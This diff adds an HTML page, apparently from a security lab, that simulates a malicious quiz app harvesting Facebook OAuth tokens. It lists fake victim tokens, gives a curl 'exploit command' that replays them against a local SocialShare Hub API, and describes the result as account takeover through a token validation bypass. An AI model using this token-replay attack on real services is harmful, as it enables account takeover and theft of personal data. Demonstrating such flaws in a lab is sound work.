@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fun Quiz App - Token Generator</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background: #f0f8ff; }
+        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
+        .quiz-header { background: #4267B2; color: white; padding: 20px; text-align: center; margin: -30px -30px 30px -30px; }
+        .token-section { background: #f8f9fa; padding: 15px; margin: 20px 0; border-radius: 5px; border: 1px solid #ddd; }
+        .token-value { font-family: monospace; background: #fff; padding: 10px; border: 1px solid #ccc; word-break: break-all; }
+        button { background: #42b883; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #369870; }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; margin: 20px 0; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="quiz-header">
+            <h1>🎯 Fun Quiz App</h1>
+            <p>Personality Quiz & Social Games</p>
+        </div>
+
+        <h2>📱 Malicious App Simulation</h2>
+        <p>This simulates a malicious "Fun Quiz App" that collects Facebook tokens from users who authenticate to take quizzes.</p>
+
+        <div class="warning">
+            <strong>🚨 Attack Scenario:</strong><br>
+            1. Users authenticate to this Quiz App to take personality quizzes<br>
+            2. Quiz App collects their Facebook OAuth tokens<br>
+            3. Attacker uses collected tokens to authenticate to SocialShare Hub<br>
+            4. Result: Account takeover without user knowledge
+        </div>
+
+        <h3>Collected User Tokens</h3>
+        <p>These are tokens the malicious Quiz App collected from users who took quizzes:</p>
+
+        <div class="token-section">
+            <strong>👩‍💼 Sarah Johnson's Token:</strong>
+            <div class="token-value" id="sarah-token">EAABwzLixnjYBOsarah123collected456from789quiz</div>
+            <button onclick="copyToken('sarah-token')">Copy Sarah's Token</button>
+        </div>
+
+        <div class="token-section">
+            <strong>👨‍💻 Mike Chen's Token:</strong>
+            <div class="token-value" id="mike-token">EAABwzLixnjYBOmike456collected789from123quiz</div>
+            <button onclick="copyToken('mike-token')">Copy Mike's Token</button>
+        </div>
+
+        <div class="token-section">
+            <strong>👩‍🎓 Emma Williams's Token:</strong>
+            <div class="token-value" id="emma-token">EAABwzLixnjYBOemma789collected123from456quiz</div>
+            <button onclick="copyToken('emma-token')">Copy Emma's Token</button>
+        </div>
+
+        <h3>🛠️ Exploit Instructions</h3>
+        <p>Use these tokens to authenticate to SocialShare Hub's API:</p>
+        
+        <div class="token-section">
+            <strong>Exploit Command:</strong>
+            <pre style="background: #2d3748; color: #e2e8f0; padding: 15px; overflow-x: auto;">curl -X POST http://127.0.0.1:8080/api/auth/social \
+  -H "Content-Type: application/json" \
+  -d '{
+    "provider": "facebook",
+    "access_token": "[PASTE_COPIED_TOKEN_HERE]"
+  }'</pre>
+        </div>
+
+        <div class="warning">
+            <strong>Expected Result:</strong><br>
+            Each token will return the corresponding user's SocialShare Hub account data, demonstrating complete account takeover through OAuth token validation bypass.
+        </div>
+
+        <button onclick="generateNewTokens()" style="margin-top: 20px;">🔄 Generate Fresh Tokens</button>
+    </div>
+
+    <script>
+        function copyToken(elementId) {
+            const tokenElement = document.getElementById(elementId);
+            navigator.clipboard.writeText(tokenElement.textContent).then(() => {
+                alert('Token copied to clipboard!');
+            });
+        }
+
+        function generateNewTokens() {
+            const prefixes = ['EAABwzLixnjYBO', 'EAAJ8Of8DF2IBAL', 'EAAGjZCZBuiQBAK'];
+            const users = ['sarah', 'mike', 'emma'];
+            const suffixes = ['collected456from789quiz', 'collected789from123quiz', 'collected123from456quiz'];
+            
+            users.forEach((user, index) => {
+                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                const randomPart = Math.random().toString(36).substring(2, 15);
+                const newToken = `${prefix}${user}${randomPart}${suffixes[index]}`;
+                document.getElementById(`${user}-token`).textContent = newToken;
+            });
+            
+            alert('Fresh tokens generated! These simulate new victims authenticating to the Quiz App.');
+        }
+    </script>
+</body>
+</html>
